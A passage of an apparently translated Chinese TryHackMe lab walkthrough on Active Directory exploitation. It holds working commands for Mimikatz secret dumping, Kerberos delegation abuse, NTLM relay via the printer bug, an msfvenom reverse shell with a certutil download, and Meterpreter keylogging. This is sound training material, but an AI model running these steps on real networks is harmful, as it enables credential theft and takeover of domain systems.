class="line">SID name  : NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::secrets</span><br><span class="line">Domain : THMWRK1</span><br><span class="line">SysKey : redacted</span><br><span class="line"></span><br><span class="line">Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 )</span><br><span class="line">Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )</span><br><span class="line">Domain FQDN : za.tryhackme.loc</span><br><span class="line"></span><br><span class="line">Policy subsystem is : 1.18</span><br><span class="line">LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}</span><br><span class="line">  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463</span><br><span class="line"></span><br><span class="line">Secret  : $MACHINE.ACC</span><br><span class="line">cur/text: redacted</span><br><span class="line">    NTLM:redacted</span><br><span class="line">    SHA1:redacted</span><br><span class="line">old/text: redacted</span><br><span class="line">    NTLM:redacted</span><br><span class="line">    SHA1:redacted</span><br><span class="line"></span><br><span class="line">Secret  : DefaultPassword</span><br><span class="line">cur/text: redacted</span><br><span class="line">old/text: redacted</span><br><span class="line"></span><br><span class="line">Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc</span><br><span class="line">cur/text: redacted</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></tbody></table></figure>

<p>让我们运行一下这两个命令：</p>
<ul>
<li>token::elevate - 要从注册表配置单元转储机密，我们需要模拟 SYSTEM 用户。</li>
<li>lsadump::secrets - Mimikatz 与注册表配置单元交互以提取明文凭据。</li>
</ul>
<p>现在我们可以访问与 svcIIS 帐户关联的密码，我们可以执行 Kerberos 委派攻击。 我们将使用 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">Kkeo</a> 和 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/security">Mimikatz</a> 的组合。 您可以为 Mimikatz 使用另一个窗口，但请确保在执行 <code>token::elevate</code> 命令后退出 Mimikatz，否则稍后将在错误的上下文中加载票证。 我们将使用 Kekeo 生成票证，然后使用 Mimikatz 将这些票证加载到内存中。 让我们从生成票开始：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         PS C:\&gt; C:\Tools\kekeo\x64\kekeo.exe</span><br><span class="line"></span><br><span class="line">  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55</span><br><span class="line"> /   ('&gt;-  "A La Vie, A L'Amour"</span><br><span class="line"> | K  |    /* * *</span><br><span class="line"> \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line">  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)</span><br><span class="line">                                             with 10 modules * * */</span><br><span class="line"></span><br><span class="line">kekeo #</span><br></pre></td></tr></tbody></table></figure>

<p>我们首先需要生成一个 TGT，可用于生成 HTTP 和 WSMAN 服务的票证：</p>
<p> 克克奥</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted</span><br><span class="line">Realm        : za.tryhackme.loc (za)</span><br><span class="line">User         : svcIIS (svcIIS)</span><br><span class="line">CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]</span><br><span class="line">SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]</span><br><span class="line">Need PAC     : Yes</span><br><span class="line">Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a</span><br><span class="line">[kdc] name: THMDC.za.tryhackme.loc (auto)</span><br><span class="line">[kdc] addr: 172.31.1.101 (auto)</span><br><span class="line">  &gt; Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'</span><br></pre></td></tr></tbody></table></figure>

<p>参数解释：</p>
<ul>
<li>用户 - 具有受限委派权限的用户。</li>
<li>域 - 我们正在攻击的域，因为 Kekeo 可用于伪造票证以滥用跨林信任。</li>
<li>密码 - 与 svcIIS 帐户关联的密码。</li>
</ul>
<p>现在我们有了可以执行委托的帐户的 TGT，我们可以为我们想要模拟的帐户伪造 TGS 请求。 我们需要对 HTTP 和 WSMAN 执行此操作，以允许我们在 THMSERVER1 上创建 PSSession：</p>
<p> 克克奥</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc</span><br><span class="line">Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</span><br><span class="line">  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC</span><br><span class="line">  [krb-cred]     E: [00000012] aes256_hmac</span><br><span class="line">  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC</span><br><span class="line">  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC</span><br><span class="line">  [enc-krb-cred] T: [4/30/2022 1:29:00 PM ; 4/30/2022 11:29:00 PM] {R:5/7/2022 1:29:00 PM}</span><br><span class="line">  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;</span><br><span class="line">  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 548e500d4ee2f5c61710254ea9dd43e2ce0123026d329c97e512695e2f1777a7</span><br><span class="line">  [s4u2self] t1_trevor.jones</span><br><span class="line">[kdc] name: THMDC.za.tryhackme.loc (auto)</span><br><span class="line">[kdc] addr: 172.31.1.101 (auto)</span><br><span class="line">  &gt; Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'</span><br><span class="line">Service(s):</span><br><span class="line">  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc</span><br><span class="line">  &gt; Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'</span><br></pre></td></tr></tbody></table></figure>

<p>参数解释：</p>
<ul>
<li>tgt - 我们提供在上一步中生成的 TGT。</li>
<li>user - 我们想要模拟的用户。 由于 t2_ 帐户具有工作站的管理访问权限，因此可以安全地假设 t1_ 帐户将具有服务器的管理访问权限，因此请选择您想要模拟的 t1_ 帐户。</li>
<li>服务 - 我们想要使用委托来模拟的服务。 我们首先为 HTTP 服务生成一个 TGS。 然后我们可以为 WSMAN 服务重新运行相同的命令。</li>
</ul>
<p>再次运行该命令，这次是针对 WSMAN 服务。 现在我们有了两张 TGS 票据，我们可以使用 Mimikatz 导入它们：</p>
<p>mimikatz</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege '20' OK</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</span><br><span class="line"></span><br><span class="line">* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</span><br><span class="line"></span><br><span class="line">* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK</span><br></pre></td></tr></tbody></table></figure>

<p>如果您想验证票证是否已导入，您可以退出 Mimikatz 并运行“klist”。 现在票证已导入，我们终于可以在 THMSERVER1 上创建 PSSession：</p>
<p>电源外壳</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         mimikatz # exit</span><br><span class="line">Bye!</span><br><span class="line">PS C:&gt; New-PSSession -ComputerName thmserver1.za.tryhackme.loc</span><br><span class="line"></span><br><span class="line"> Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability</span><br><span class="line"> -- ----            ------------    ------------    -----         -----------------     ------------</span><br><span class="line">  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\&gt; Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc</span><br><span class="line">[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents&gt; whoami</span><br><span class="line">za\t1_trevor.jones</span><br></pre></td></tr></tbody></table></figure>

<p>通过利用约束委派，我们现在拥有访问 THMSERVER1 的特权！</p>
<h1 id="Exploiting-Automated-Relays"><a href="#Exploiting-Automated-Relays" class="headerlink" title="Exploiting Automated Relays"></a>Exploiting Automated Relays</h1><p>在此任务中，我们将了解一些自动继电器。 身份验证尝试不断地在网络上飞来飞去，正如 Breaching AD room 所示，如果幸运的话，我们可以拦截其中一些挑战以获得访问权限。 但如果我们不喜欢等待怎么办？ 如果我们可以强制进行身份验证怎么办？</p>
<p>尽管我们已经拥有对 THMSERVER1 的特权访问权限，但我们可能无法访问受限委派漏洞。 这是另一种出色的攻击，可以通过执行该攻击来获得对主机的特权访问。</p>
<p>机器账户</p>
<p>所有 Windows 主机都有一个计算机帐户。 本质上，这是与计算机关联的用户帐户。 除非有人篡改了主机的账户，否则这些账户的密码是无法破解的。 默认情况下，它们的长度为 120 个字符 (UTF16)，并且每 30 天自动轮换一次。</p>
<p>在 AD 中，这些计算机帐户在不同的服务中被大量使用。 不同的域控制器使用其计算机帐户来同步 AD 更新和更改。 当您代表正在使用的主机请求证书时，该主机的计算机帐户将用于对 AD 证书服务进行身份验证。</p>
<p>AD 中有一种特殊情况，其中一台机器对另一台机器具有管理员权限。 本质上，在 AD 配置中，一台主机的管理权限已被授予另一台主机。 同样，这是必须同步的域控制器或 SQL 集群等预期功能。 然而，这些实例为强制身份验证提供了非常有趣的攻击媒介。</p>
<p>我们首先需要确定计算机帐户对另一台计算机具有管理访问权限的情况。 我们可以使用 Bloodhound 来实现此目的，但这意味着我们必须编写一些自定义密码查询。 单击 Bloodhound 中“分析”选项卡中的“创建自定义查询”：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6d3352c2ddd2b1013ed0cce50be2a2a4.png" alt="Bloodhound raw query"></p>
<p>我们要编写以下查询：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">MATCH p=(c1:Computer)-[r1:MemberOf*1..]-&gt;(g:Group)-[r2:AdminTo]-&gt;(n:Computer) RETURN p</span><br></pre></td></tr></tbody></table></figure>

<p>此查询将尝试查找一台计算机与另一台计算机具有“AdminTo”关系的实例。 您应该看到与此类似的输出：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/43d7164804282cedecd32a90c10c102b.png" alt="Bloodhound Attack Path"></p>
<p>这很有趣。 它向我们表明 THMSERVER2 计算机帐户对 THMSERVER1 计算机具有管理权限。</p>
<p>打印机错误</p>
<p><em>这不是一个错误，而是一个功能 - Microsoft。</em></p>
<p>说真的，当此事被报道时，微软回应称这是一项功能。 打印机错误是 MS-RPRN 协议（PrintSystem 远程协议）的一项“功能”，该协议允许域用户远程强制运行 Print Spooler 服务的目标主机对任意 IP 地址进行身份验证。 近年来出现了一些这样的错误：Spooler、PetitPotam、PrintNightmare。 微软声称唯一的错误是其中一些根本不需要 AD 凭据，但这个问题已通过安全补丁解决。</p>
<p>因此，要利用这一点，除了机器帐户管理权限外，我们还需要满足以下四个条件：</p>
<ol>
<li>一组有效的 AD 帐户凭据。</li>
<li>与目标 SMB 服务的网络连接。</li>
<li>目标主机必须运行Print Spooler 服务。</li>
<li>主机不得强制执行 SMB 签名。</li>
</ol>
<p>条件 1 和 2 已经满足。 我们需要确保工作的唯一两个条件是条件 3 和 4。</p>
<p>打印后台处理程序服务</p>
<p>我们需要确定打印后台处理程序服务是否正在运行。 由于我们无法访问THMSERVER2，所以需要从网络角度进行查询。 在这种情况下，我们可以使用 THMWRK1 上的 SSH 会话中的 WMI 查询来查询服务的当前状态：</p>
<p> PowerShell</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         PS C:\&gt; GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Location      :</span><br><span class="line">Name          : Microsoft XPS Document Writer</span><br><span class="line">PrinterState  : 0</span><br><span class="line">PrinterStatus : 3</span><br><span class="line">ShareName     :</span><br><span class="line">SystemName    : THMSERVER2</span><br><span class="line"></span><br><span class="line">Location      :</span><br><span class="line">Name          : Microsoft Print to PDF</span><br><span class="line">PrinterState  : 0</span><br><span class="line">PrinterStatus : 3</span><br><span class="line">ShareName     :</span><br><span class="line">SystemName    : THMSERVER2</span><br></pre></td></tr></tbody></table></figure>

<p>cmdlet 的输出验证服务是否正在运行。 如果我们收到访问被拒绝错误，您也许可以尝试使用 PowerShell 命令“Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc”。 然而，微软一直在打击从网络角度查看这些端口。 如果两者都给你带来了错误，你可能只需要大胆尝试一下。 这样，条件三就满足了。</p>
<p>中小企业签名</p>
<p>为了中继强制身份验证尝试，不应强制执行 SMB 签名。 应该注意的是，允许 SMB 签名和强制执行 SMB 签名之间存在差异。 由于某些旧系统不支持 SMB 签名，因此默认情况下，SMB 的配置是允许但不强制签名，这意味着只有支持时才会使用它。 由于我们将托管恶意 SMB 服务器，因此我们可以确保我们的服务器不支持签名，从而强制目标不对 SMB 身份验证尝试进行签名。</p>
<p>要验证 THMSERVER1 和 THMSERVER2 没有强制执行 SMB 签名，我们可以在 AttackBox 上使用 Nmap：</p>
<p> 终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         thm@thm:~# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc</span><br><span class="line">Nmap scan report for distributor.za.tryhackme.loc (172.31.1.201)</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.31.1.202</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">Nmap done: 2 IP addresses (2 hosts up) scanned in 4.59 seconds</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以看到 SMB 签名已启用，但根据输出并未强制执行。 这意味着我们所有的条件都满足了，我们可以开始进攻了！</p>
<p>利用身份验证中继</p>
<p><strong>注意：此攻击可能不稳定。 滥用打印后台处理程序服务可能会导致其崩溃，并且并不总是保证回调。 因此，上一个任务已为您提供了继续所需的权限。 然而，了解身份验证中继以及如何强制执行它们对于 AD 攻击至关重要。 因此，下面提供了执行此类攻击的步骤。 您可以决定尝试一下，但不能保证回调。 如果它不起作用，请继续执行下一个任务，也许在您的房间旅程结束时再次探索这个问题。</strong></p>
<p>我们将使用 <a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> 来利用身份验证中继。 它是一个 C# 漏洞，但已为您编译并存储在 THMWRK1 上的“C:\Tools\”目录中。 我们将使用 Spoolsample.exe 强制 THMSERVER2 在 AttackBox 上向我们进行身份验证，然后使用 <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">Impacket</a> 的 [ntlmrelayx.py](<a target="_blank" rel="noopener" href="https://github.com/">https://github.com/</a> SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) 来中继身份验证尝试 THMSERVER1。 请注意，如果您使用自己的 VM，则需要确保您拥有支持 SMBv2 的 Impacket 更新版本。</p>
<p>第一步是设置 NTLM 中继。 在我们的 AttackBox 上，我们可以使用以下内容：</p>
<p> 终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">thm@thm:~# python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug</span><br></pre></td></tr></tbody></table></figure>

<p>如果我们指定 THMSERVER1 的主机名而不是 IP，主机可能会请求我们使用 Kerberos 身份验证而不是 NTLM。 因此我们应该指定 IP。 通过中继侦听，我们现在可以强制 THMSERVER2 向我们进行身份验证。 在 THMWRK1 上的 SSH 终端中，执行以下命令：</p>
<p> 终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Tools\&gt;SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"</span><br></pre></td></tr></tbody></table></figure>

<p>您的攻击者 IP 应与网络的 tunX 接口相对应。 如果一切顺利，您应该已收到身份验证尝试和到 THMSERVER1 的中继。</p>
<p> 终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         thm$ python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug</span><br><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] SMBD-Thread-5: Received connection from 172.31.1.202, attacking target smb://172.31.1.201</span><br><span class="line">[*] Authenticating against smb://172.31.1.201 as ZA/THMSERVER2$ SUCCEED</span><br><span class="line">[+] No more targets</span><br><span class="line">[*] SMBD-Thread-7: Connection from 172.31.1.202 controlled, but there are no more targets left!</span><br><span class="line">[+] No more targets</span><br><span class="line">[*] SMBD-Thread-8: Connection from 172.31.1.202 controlled, but there are no more targets left!</span><br><span class="line">[*] Service RemoteRegistry is in stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[+] ExecuteRemote command: %COMSPEC% /Q /c echo whoami /all ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span><br><span class="line">[*] Executed specified command on host: 172.31.1.201</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name           SID     </span><br><span class="line">=================== ========</span><br><span class="line">nt authority\system S-1-5-18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                             Type             SID          Attributes                                        </span><br><span class="line">====================================== ================ ============ ==================================================</span><br><span class="line">BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    </span><br><span class="line">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   </span><br><span class="line">[...]</span><br></pre></td></tr></tbody></table></figure>

<p>此输出类似于使用“-c ‘whoami /all’”命令时会发生的情况。 但是，通过不指定任何命令，您现在应该已经执行了哈希转储。 现在可以使用这些凭据在主机上获取 shell！</p>
<h1 id="Exploiting-AD-Users"><a href="#Exploiting-AD-Users" class="headerlink" title="Exploiting AD Users"></a>Exploiting AD Users</h1><p>到目前为止，我们的开发已经取得了很大进展。 我们拥有对工作站和服务器的完全管理访问权限。 本质上，我们可以在几乎任何第 1 层和第 2 层系统上执行后利用。 但我们仍然想走得更远。 下一个任务也可以被视为后利用，但当我们仍在执行利用以达到目标执行的合适位置时，通常是一个很好的选择。 现在是我们瞄准AD用户的时候了。</p>
<p>用户和用户行为</p>
<p><em>未来的工厂将只有两名员工。 一个人和一只狗。 人类将在那里喂狗。 如果人类试图触摸某物，狗就会咬人。 - 沃伦·本尼斯</em></p>
<p>不幸的是，用户往往是安全链中最薄弱的环节。 只需考虑一下弱密码和坏习惯，例如授予过于宽松的权限。 忽视这个攻击面是无知且无效的。 虽然针对 AD 用户建立适当的枚举和攻击方法是件好事，但在此任务中，我们将重点关注两个要素：</p>
<ul>
<li>凭证管理 - 用户如何存储其凭证。 在 AD 中，这一点非常重要，因为用户可能拥有多组凭据，并且记住所有这些凭据可能会很麻烦。</li>
<li>键盘记录 - 通常，在利用过程中，我们需要了解普通用户如何与系统交互。 与屏幕截图一起，键盘记录可以成为从攻击者的角度获得这种理解的有用工具。</li>
</ul>
<p>寻找凭证</p>
<p>既然我们已经破坏了 THMSERVER1，我们可能应该四处看看是否有任何有用的信息。 查看用户目录，看看其中是否有一些有用的信息。</p>
<p>您的枚举工作应该会引导您找到 .kdbx 文件。 快速谷歌一下应该会证实我们的怀疑，这个文件确实非常有价值！ 我们可以使用Meterpreter的下载命令来恢复这个文件。</p>
<p>该文件似乎是一个凭证数据库。 然而，问题是数据库是用密码加密的。 我们可以尝试破解密码，但使用凭证数据库的任何人通常都具有确保初始密码安全的能力。 看看用户如何与该数据库交互，我们可能会取得更大的成功。</p>
<p>SYSTEM 有时特权太高</p>
<p>Meterpreter 有一个内置的键盘记录器。 这对于提取用户的击键非常有用。 然而，我们不能只是启动这个键盘记录器并希望得到最好的结果，因为我们的 shell 当前正在系统上下文中运行。 SYSTEM 不会输入任何按键，所以这对我们没有帮助。 为了捕获正确的用户凭据，我们需要确保 shell 正在该用户的上下文中运行。</p>
<p>幸运的是，Meterpreter 为我们提供了迁移功能，由于我们以 SYSTEM 身份运行，所以我们应该能够迁移到任何进程。 您可以在 THMSERVER1 上执行远程代码，使用它来获取 Meterpreter shell。 如果您需要回顾一下 Meterpreter 和 Metasploit 的使用，<a target="_blank" rel="noopener" href="https://tryhackme.com/module/metasploit">这里有一个关于其使用的模块。</a> 但是，为了快速了解，您可以使用以下命令生成 PowerShell Meterpreter有效负载：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1</span><br></pre></td></tr></tbody></table></figure>

<p>然后，您还可以使用以下命令在 msfconsole 中创建关联的侦听器：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD  windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT  "listening port'; exploit"</span><br></pre></td></tr></tbody></table></figure>

<p>您可以使用 Python Web 服务器托管 meterpreter shell，然后使用如下内容复制它：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:///shell.ps1</span><br></pre></td></tr></tbody></table></figure>

<p>一旦您拥有了 meterpreter shell，您就可以继续。 第一步是查看用户本机上是否有正在运行的进程：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         meterpreter\&gt;ps | grep "explorer"</span><br><span class="line">Filtering on 'explorer'</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name          Arch  Session  User                     Path</span><br><span class="line"> ---   ----  ----          ----  -------  ----                     ----</span><br><span class="line"> 3612  3592  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe</span><br></pre></td></tr></tbody></table></figure>

<p><strong>注意：</strong> 如果您没有看到 trevor.local 用户的 explorer.exe 进程，您可以通过执行以下步骤自行启动该进程：</p>
<ol>
<li>使用以下命令重置 trevor.local 用户的密码：<code>net user trevor.local &lt;选择的密码&gt;</code></li>
<li>在 powershell 中运行以下命令：<code>C:\auto-login.ps1 trevor.local &lt;选择的密码&gt; THMSERVER1</code><br>3.使用“shutdown -r”重新启动服务器</li>
<li>服务器重新联机后，您应该会看到资源管理器进程。</li>
</ol>
<p>看来我们很幸运！ 用户在 THMSERVER1 上有一个活动会话。 让我们迁移到该用户的一个进程。 最安全的选择通常是像explorer.exe这样：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         meterpreter\&gt;migrate 3612</span><br><span class="line">[*] Migrating from 4408 to 3612...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以使用 getuid 命令确认我们现在正在目标的上下文中运行：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         meterpreter\&gt;getuid</span><br><span class="line">Server username: THMSERVER1\trevor.local</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们准备启动我们的键盘记录器：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         meterpreter\&gt;keyscan_start</span><br><span class="line">Starting the keystroke sniffer ...</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们必须耐心等待。 如果幸运的话，我们将获得一些凭证！ 给它几分钟，然后运行以下命令来转储捕获的击键：</p>
<p>终端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         meterpreter\&gt;keyscan_dump</span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">keep&lt;CR&gt;</span><br><span class="line">&lt;Shift&gt;Passwordpasswordpassword&lt;CR&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>这是针对 AD 用户的一个简单示例。 还有很多事情可以做。 将用户定位纳入 AD 开发方法中至关重要。 要回答此任务的问题，您将需要 Keepass。 它已为您安装在 AttackBox 上，因此您只需搜索并运行该应用程序即可。 如果您使用自己的虚拟机，则在大多数 Linux 发行版上“sudo apt install keepassx”都可以工作。 或者您可以从<a target="_blank" rel="noopener" href="https://keepass.info/download.html">此处</a>下载。 另请确保使用 meterpreter“download”命令将 Keepass 数据库下载到您的主机。 如果您使用 Kali，请在打开数据库文件之前确保 kali 用户拥有该数据库文件，否则可能会锁定数据库并给出错误的结果。</p>
<p>虽然持久性只会在隔壁房间讨论，但现在可能是在 THMSERVER1 上创建本地帐户并授予其管理员权限的好时机，以便您有一个良好的立足点。 由于其余任务实际上并不需要这样做，因此如果您想这样做，您需要自己对此进行一些研究。</p>
<h1 id="Exploiting-GPOs"><a href="#Exploiting-GPOs" class="headerlink" title="Exploiting GPOs"></a>Exploiting GPOs</h1><p>通过对用户进行键盘记录，我们可以解密他们的凭据数据库，从而为我们提供有助于进一步实现 AD 攻击目标的凭据，即 svcServMan 帐户。 我们需要执行一些枚举来弄清楚这些凭证的用途。 幸运的是，我们已经有了可以使用的 Sharphound 数据。 使用 Bloodhound 中的搜索功能，让我们检查一下所发现的帐户拥有的权限：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/adfa79bdc188b1c88a8200d44112bccf.png" alt="Bloodhound attack path"></p>
<p>该帐户的一项权限尤其突出，即对组策略对象 (GPO) 的所有权。 此外，当我们进行一些调查时，似乎此 GPO 已应用于我们的 THMSERVER2 机器：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/3a911e2876de1ee5cda169cd2089a0ce.png" alt="Bloodhound attack path"></p>
<p>这可能为我们提供进一步开发 AD 的理想机会！</p>
<p>组策略对象</p>
<p>还记得我们在枚举 AD 中讨论过 SYSVOL 目录吗？ 这是存储 AD GPO 的目录，以便将其复制到加入域的计算机。 GPO 是策略设置的虚拟集合。 每个 GPO 都有一个唯一的名称，称为 GUID。 这就是为什么如果您尝试读取 SYSVOL 目录的内容，那么所有随机名称都没有多大意义。</p>
<p>每台 Windows 计算机都有一个本地策略配置。 这包含几个值得注意的配置，例如：</p>
<ul>
<li>防火墙、防病毒和 Applocker 等服务的应用程序配置。</li>
<li>本地组成员身份，例如管理员或远程桌面用户组。</li>
<li>启动配置，例如应执行的脚本。</li>
<li>安全和协议设置，例如 SMBv1 支持。</li>
</ul>
<p>这些只是几个例子。 有大量可以设置的配置选项。</p>
<p>组策略管理</p>
<p>如果您只有一台 Windows 计算机，则可以轻松地直接在主机上更改本地策略配置。 但是，您需要一种机制来从大型组织的中央位置部署配置。 这就是组策略管理 (GPM) 发挥作用的地方。 GPM 允许我们直接在 AD 结构上定义策略，而不是在每台机器上本地定义策略。 本质上，我们可以为 AD 对象定义 GPO，例如特定的 OU 或组。</p>
<p>然后，加入域的计算机将定期从 SYSVOL 中提取所有策略并应用相关策略。 默认情况下，策略每 15 分钟通过 gpupdate 应用程序复制一次。 但是，我们也可以从命令提示符手动执行此应用程序以立即应用策略。</p>
<p>利用 GPO</p>
<p>尽管可以通过多种方式利用 GPO，但我们将坚持使用简单的解决方案，将我们控制的 AD 帐户添加到本地管理员组和本地远程桌面用户组。 这将允许我们获得 THMSERVER2 的管理权限以及 RDP 的能力。我们还可以使用公开的 SSH 端口，但没有多少组织已升级为提供 SSH 访问。 因此，RDP 访问或 SMBExec 等传统横向移动技术更安全。</p>
